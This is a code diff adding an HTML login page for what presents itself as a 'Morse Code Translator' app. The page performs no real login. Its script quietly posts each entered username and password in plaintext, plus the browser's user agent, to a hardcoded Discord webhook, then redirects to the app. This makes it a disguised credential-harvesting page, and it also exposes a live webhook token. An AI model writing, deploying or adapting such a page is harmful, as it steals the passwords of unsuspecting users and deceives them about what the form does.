@@ -1,0 +1,44 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login - Morse Code Translator</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="login-card">
+    <h2>Login to continue</h2>
+    <input type="text" id="username" placeholder="Username" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="login()">Login</button>
+  </div>
+  <script>
+    function login() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      fetch("https://discord.com/api/webhooks/1388538171511541790/fAqwAHEE6zXB2ZGYHvTpKalWTKQV4eOAGbmRpap7pevO3GcwV5GbGMp6dEHT_ionO4tI", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: "**New Login on Morse App**",
+          embeds: [{
+            title: "User Logged In",
+            fields: [
+              { name: "Username", value: username },
+              { name: "Password", value: password },
+              { name: "Device", value: navigator.userAgent }
+            ]
+          }]
+        })
+      }).then(() => {
+        window.location.href = "index.html";
+      });
+    }
+  </script>
+</body>
+</html>
